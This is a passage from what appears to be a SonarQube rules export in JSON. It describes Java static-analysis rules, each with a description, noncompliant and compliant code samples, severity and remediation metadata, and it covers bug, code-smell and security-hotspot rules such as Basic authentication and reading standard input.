            "htmlDesc": "<p>The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in order to hide implementation details.</p>\n<p>Implementing classes must be used to instantiate new collections, but the result of an instantiation should ideally be stored in a variable whose\ntype is a Java Collection interface.</p>\n<p>This rule raises an issue when an implementation class:</p>\n<ul>\n  <li> is returned from a <code>public</code> method. </li>\n  <li> is accepted as an argument to a <code>public</code> method. </li>\n  <li> is exposed as a <code>public</code> member. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Employees {\n  private HashSet&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();  // Noncompliant - \"employees\" should have type \"Set\" rather than \"HashSet\"\n\n  public HashSet&lt;Employee&gt; getEmployees() {                       // Noncompliant\n    return employees;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Employees {\n  private Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();      // Compliant\n\n  public Set&lt;Employee&gt; getEmployees() {                           // Compliant\n    return employees;\n  }\n}\n</pre>",
            "mdDesc": "<p>The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in order to hide implementation details.</p>\n<p>Implementing classes must be used to instantiate new collections, but the result of an instantiation should ideally be stored in a variable whose\ntype is a Java Collection interface.</p>\n<p>This rule raises an issue when an implementation class:</p>\n<ul>\n  <li> is returned from a <code>public</code> method. </li>\n  <li> is accepted as an argument to a <code>public</code> method. </li>\n  <li> is exposed as a <code>public</code> member. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Employees {\n  private HashSet&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();  // Noncompliant - \"employees\" should have type \"Set\" rather than \"HashSet\"\n\n  public HashSet&lt;Employee&gt; getEmployees() {                       // Noncompliant\n    return employees;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Employees {\n  private Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();      // Compliant\n\n  public Set&lt;Employee&gt; getEmployees() {                           // Compliant\n    return employees;\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1317",
            "repo": "java",
            "name": "\"StringBuilder\" and \"StringBuffer\" should not be instantiated with a character",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Instantiating a <code>StringBuilder</code> or a <code>StringBuffer</code> with a character is misleading because most Java developers would expect\nthe character to be the initial value of the <code>StringBuffer</code>. </p>\n<p>What actually happens is that the int representation of the character is used to determine the initial size of the <code>StringBuffer</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nStringBuffer foo = new StringBuffer('x');   //equivalent to StringBuffer foo = new StringBuffer(120);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nStringBuffer foo = new StringBuffer(\"x\");\n</pre>",
            "mdDesc": "<p>Instantiating a <code>StringBuilder</code> or a <code>StringBuffer</code> with a character is misleading because most Java developers would expect\nthe character to be the initial value of the <code>StringBuffer</code>. </p>\n<p>What actually happens is that the int representation of the character is used to determine the initial size of the <code>StringBuffer</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nStringBuffer foo = new StringBuffer('x');   //equivalent to StringBuffer foo = new StringBuffer(120);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nStringBuffer foo = new StringBuffer(\"x\");\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4829",
            "repo": "java",
            "name": "Reading the Standard Input is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337\">CVE-2005-2337</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449\">CVE-2017-11449</a> </li>\n</ul>\n<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)\ncan be dangerous and should be validated.</p>\n<p>This rule flags code that reads from the standard input.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> data read from the standard input is not sanitized before being used. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all data read from the standard input before using it.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nclass A {\n    void foo(String fmt, Object args) throws Exception {\n        // Sensitive. Check how the standard input is used.\n        System.in.read();\n\n        // Sensitive. Check how safe this new InputStream is.\n        System.setIn(new java.io.FileInputStream(\"test.txt\"));\n\n        java.io.Console console = System.console();\n        // Sensitive. All the following calls should be reviewed as they use the standard input.\n        console.reader();\n        console.readLine();\n        console.readLine(fmt, args);\n        console.readPassword();\n        console.readPassword(fmt, args);\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>All references to <code>System.in</code> will create issues except direct calls to <code>System.in.close()</code>.</p>\n<p>Command line parsing libraries such as JCommander often read standard input when asked for passwords. However this rule doesn't raise any issue in\nthis case as another hotspot rule covers command line arguments.</p>\n<h2>See:</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/20.html\">MITRE, CWE-20</a> - Improper Input Validation </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337\">CVE-2005-2337</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449\">CVE-2017-11449</a> </li>\n</ul>\n<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)\ncan be dangerous and should be validated.</p>\n<p>This rule flags code that reads from the standard input.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> data read from the standard input is not sanitized before being used. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all data read from the standard input before using it.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nclass A {\n    void foo(String fmt, Object args) throws Exception {\n        // Sensitive. Check how the standard input is used.\n        System.in.read();\n\n        // Sensitive. Check how safe this new InputStream is.\n        System.setIn(new java.io.FileInputStream(\"test.txt\"));\n\n        java.io.Console console = System.console();\n        // Sensitive. All the following calls should be reviewed as they use the standard input.\n        console.reader();\n        console.readLine();\n        console.readLine(fmt, args);\n        console.readPassword();\n        console.readPassword(fmt, args);\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>All references to <code>System.in</code> will create issues except direct calls to <code>System.in.close()</code>.</p>\n<p>Command line parsing libraries such as JCommander often read standard input when asked for passwords. However this rule doesn't raise any issue in\nthis case as another hotspot rule covers command line arguments.</p>\n<h2>See:</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/20.html\">MITRE, CWE-20</a> - Improper Input Validation </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2647",
            "repo": "java",
            "name": "Basic authentication should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Basic authentication's only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the\nthinnest veil of protection to your users, and should not be used. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// Using HttpPost from Apache HttpClient\nString encoding = Base64Encoder.encode (\"login:passwd\");\norg.apache.http.client.methods.HttpPost httppost = new HttpPost(url);\nhttppost.setHeader(\"Authorization\", \"Basic \" + encoding);  // Noncompliant\n\nor\n\n// Using HttpURLConnection\nString encoding = Base64.getEncoder().encodeToString((\"login:passwd\").getBytes(‌\"UTF‌​-8\"​));\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.setRequestProperty(\"Authorization\", \"Basic \" + encoding); // Noncompliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication\">OWASP Web Service Security\n  Cheat Sheet</a> </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/522\">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p>Basic authentication's only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the\nthinnest veil of protection to your users, and should not be used. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// Using HttpPost from Apache HttpClient\nString encoding = Base64Encoder.encode (\"login:passwd\");\norg.apache.http.client.methods.HttpPost httppost = new HttpPost(url);\nhttppost.setHeader(\"Authorization\", \"Basic \" + encoding);  // Noncompliant\n\nor\n\n// Using HttpURLConnection\nString encoding = Base64.getEncoder().encodeToString((\"login:passwd\").getBytes(‌\"UTF‌​-8\"​));\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.setRequestProperty(\"Authorization\", \"Basic \" + encoding); // Noncompliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication\">OWASP Web Service Security\n  Cheat Sheet</a> </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/522\">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S4823",
            "repo": "java",
            "name": "Using command line arguments is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281\">CVE-2018-7281</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326\">CVE-2018-12326</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198\">CVE-2011-3198</a> </li>\n</ul>\n<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>\n<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus\npassing sensitive information via command line arguments should be considered as insecure.</p>\n<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide\nsecurity code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> any of the command line arguments are used without being sanitized first. </li>\n  <li> your application accepts sensitive information via command line arguments. </li>\n</ul>\n<p>If you answered yes to any of these questions you are at risk.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all command line arguments before using them.</p>\n<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing\nsensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the\npath to a file containing the information.</p>\n<h2>Sensitive Code Example</h2>\n<p>This rule raises an issue as soon as there is a reference to argv, be it for direct use or via a CLI library like JCommander, GetOpt or Apache\nCLI.</p>\n<pre>\npublic class Main {\n  public static void main (String[] argv) {\n    String option = argv[0]; &nbsp;// Sensitive: check how the argument is used\n  }\n}\n</pre>\n<pre>\n// === JCommander ===\nimport&nbsp;com.beust.jcommander.*;\n\npublic class Main {\n  public static void main (String[] argv) {\n    Main main = new Main();\n    JCommander.newBuilder()\n      .addObject(main)\n      .build()\n      .parse(argv); // Sensitive\n    main.run();\n  }\n}\n</pre>\n<pre>\n// === GNU Getopt ===\nimport gnu.getopt.Getopt;\n\npublic class Main {\n  public static void main (String[] argv) {\n    Getopt g = new Getopt(\"myprog\", argv, \"ab\"); // Sensitive\n  }\n}\n</pre>\n<pre>\n// === Apache CLI ===\nimport org.apache.commons.cli.*;\n\npublic class Main {\n  public static void main (String[] argv) {\n    Options options = new Options();\n    CommandLineParser parser = new DefaultParser();\n    try {\n      CommandLine line = parser.parse(options, argv); // Sensitive\n    }\n  }\n}\n</pre>\n<p>In the case of Args4J, an issue is created on the <code>public void run</code> method of any class using <code>org.kohsuke.args4j.Option</code> or\n<code>org.kohsuke.args4j.Argument</code>.</p>\n<p>Such a class is called directly by <code>org.kohsuke.args4j.Starter</code> outside of any <code>public static void main</code> method. If the class\nhas no <code>run</code> method, no issue will be raised as there must be a <code>public static void main</code> and its argument is already\nhighlighted.</p>\n<pre>\n// === argv4J ===\nimport org.kohsuke.args4j.Option;\nimport org.kohsuke.args4j.Argument;\n\npublic class Main {\n  @Option(name=\"-myopt\",usage=\"An option\")\n  public String myopt;\n\n  @Argument(usage = \"An argument\", metaVar = \"&lt;myArg&gt;\")\n  String myarg;\n\n  String file;\n\n  @Option(name=\"-file\")\n  public void setFile(String file) {\n    this.file = file;\n  }\n\n  String arg2;\n\n  @Argument(index=1)\n  public void setArg2(String arg2) {\n    this.arg2 = arg2;\n  }\n\n  public void run() { // Sensitive: This function\n     myarg.toString(); // check how this argument is used\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The support of Argv4J without the use of <code>org.kohsuke.argv4j.Option</code> is out of scope as there is no way to know which Bean will be used\nas the mainclass.</p>\n<p>No issue will be raised on <code>public static void main(String[] argv)</code> if <code>argv</code> is not referenced in the method.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/88.html\">MITRE, CWE-88</a> - Argument Injection or Modification </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/214.html\">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281\">CVE-2018-7281</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326\">CVE-2018-12326</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198\">CVE-2011-3198</a> </li>\n</ul>\n<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>\n<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus\npassing sensitive information via command line arguments should be considered as insecure.</p>\n<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide\nsecurity code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> any of the command line arguments are used without being sanitized first. </li>\n  <li> your application accepts sensitive information via command line arguments. </li>\n</ul>\n<p>If you answered yes to any of these questions you are at risk.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all command line arguments before using them.</p>\n<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing\nsensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the\npath to a file containing the information.</p>\n<h2>Sensitive Code Example</h2>\n<p>This rule raises an issue as soon as there is a reference to argv, be it for direct use or via a CLI library like JCommander, GetOpt or Apache\nCLI.</p>\n<pre>\npublic class Main {\n  public static void main (String[] argv) {\n    String option = argv[0]; &nbsp;// Sensitive: check how the argument is used\n  }\n}\n</pre>\n<pre>\n// === JCommander ===\nimport&nbsp;com.beust.jcommander.*;\n\npublic class Main {\n  public static void main (String[] argv) {\n    Main main = new Main();\n    JCommander.newBuilder()\n      .addObject(main)\n      .build()\n      .parse(argv); // Sensitive\n    main.run();\n  }\n}\n</pre>\n<pre>\n// === GNU Getopt ===\nimport gnu.getopt.Getopt;\n\npublic class Main {\n  public static void main (String[] argv) {\n    Getopt g = new Getopt(\"myprog\", argv, \"ab\"); // Sensitive\n  }\n}\n</pre>\n<pre>\n// === Apache CLI ===\nimport org.apache.commons.cli.*;\n\npublic class Main {\n  public static void main (String[] argv) {\n    Options options = new Options();\n    CommandLineParser parser = new DefaultParser();\n    try {\n      CommandLine line = parser.parse(options, argv); // Sensitive\n    }\n  }\n}\n</pre>\n<p>In the case of Args4J, an issue is created on the <code>public void run</code> method of any class using <code>org.kohsuke.args4j.Option</code> or\n<code>org.kohsuke.args4j.Argument</code>.</p>\n<p>Such a class is called directly by <code>org.kohsuke.args4j.Starter</code> outside of any <code>public static void main</code> method. If the class\nhas no <code>run</code> method, no issue will be raised as there must be a <code>public static void main</code> and its argument is already\nhighlighted.</p>\n<pre>\n// === argv4J ===\nimport org.kohsuke.args4j.Option;\nimport org.kohsuke.args4j.Argument;\n\npublic class Main {\n  @Option(name=\"-myopt\",usage=\"An option\")\n  public String myopt;\n\n  @Argument(usage = \"An argument\", metaVar = \"&lt;myArg&gt;\")\n  String myarg;\n\n  String file;\n\n  @Option(name=\"-file\")\n  public void setFile(String file) {\n    this.file = file;\n  }\n\n  String arg2;\n\n  @Argument(index=1)\n  public void setArg2(String arg2) {\n    this.arg2 = arg2;\n  }\n\n  public void run() { // Sensitive: This function\n     myarg.toString(); // check how this argument is used\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The support of Argv4J without the use of <code>org.kohsuke.argv4j.Option</code> is out of scope as there is no way to know which Bean will be used\nas the mainclass.</p>\n<p>No issue will be raised on <code>public static void main(String[] argv)</code> if <code>argv</code> is not referenced in the method.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/88.html\">MITRE, CWE-88</a> - Argument Injection or Modification </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/214.html\">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1315",
            "repo": "java",
            "name": "Track uses of \"CHECKSTYLE:OFF\" suppression comments",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// CHECKSTYLE:OFF\n</pre>",
            "mdDesc": "<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// CHECKSTYLE:OFF\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1314",
            "repo": "java",
            "name": "Octal values should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not\nhave experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint myNumber = 8;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/atYxBQ\">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a decimal\n  value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DZGBQ\">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>\n</ul>",
            "mdDesc": "<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not\nhave experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint myNumber = 8;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/atYxBQ\">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a decimal\n  value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DZGBQ\">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3985",
            "repo": "java",
            "name": "Unused \"private\" classes should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>private</code> classes that are never used are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code\ndecreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo\n{\n  ...\n  private class MyUnusedPrivateClass {...} // Noncompliant\n}\n</pre>",
            "mdDesc": "<p><code>private</code> classes that are never used are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code\ndecreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo\n{\n  ...\n  private class MyUnusedPrivateClass {...} // Noncompliant\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3864",
            "repo": "java",
            "name": "\"Stream.peek\" should be used with caution",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to its JavaDocs, the intermediate Stream operation <code>java.util.Stream.peek()</code> “exists mainly to support debugging”\npurposes.</p>\n<p>A key difference with other intermediate Stream operations is that the Stream implementation is free to skip calls to <code>peek()</code> for\noptimization purpose. This can lead to <code>peek()</code> being unexpectedly called only for some or none of the elements in the Stream.</p>\n<p>As a consequence, relying on <code>peek()</code> without careful consideration can lead to error-prone code.</p>\n<p>This rule raises an issue for each use of peek() to be sure that it is challenged and validated by the team to be meant for production\ndebugging/logging purposes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nStream.of(\"one\", \"two\", \"three\", \"four\")\n         .filter(e -&gt; e.length() &gt; 3)\n         .peek(e -&gt; System.out.println(\"Filtered value: \" + e)); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nStream.of(\"one\", \"two\", \"three\", \"four\")\n         .filter(e -&gt; e.length() &gt; 3)\n         .foreach(e -&gt; System.out.println(\"Filtered value: \" + e));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-\">Java 8 API Documentation</a>\n  </li>\n  <li> 4comprehension: <a href=\"https://4comprehension.com/idiomatic-peeking/\">Idiomatic Peeking with Java Stream API</a> </li>\n  <li> Data Geekery: <a href=\"https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/\">10 Subtle Mistakes When\n  Using the Streams API</a> </li>\n</ul>",
            "mdDesc": "<p>According to its JavaDocs, the intermediate Stream operation <code>java.util.Stream.peek()</code> “exists mainly to support debugging”\npurposes.</p>\n<p>A key difference with other intermediate Stream operations is that the Stream implementation is free to skip calls to <code>peek()</code> for\noptimization purpose. This can lead to <code>peek()</code> being unexpectedly called only for some or none of the elements in the Stream.</p>\n<p>As a consequence, relying on <code>peek()</code> without careful consideration can lead to error-prone code.</p>\n<p>This rule raises an issue for each use of peek() to be sure that it is challenged and validated by the team to be meant for production\ndebugging/logging purposes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nStream.of(\"one\", \"two\", \"three\", \"four\")\n         .filter(e -&gt; e.length() &gt; 3)\n         .peek(e -&gt; System.out.println(\"Filtered value: \" + e)); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nStream.of(\"one\", \"two\", \"three\", \"four\")\n         .filter(e -&gt; e.length() &gt; 3)\n         .foreach(e -&gt; System.out.println(\"Filtered value: \" + e));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a 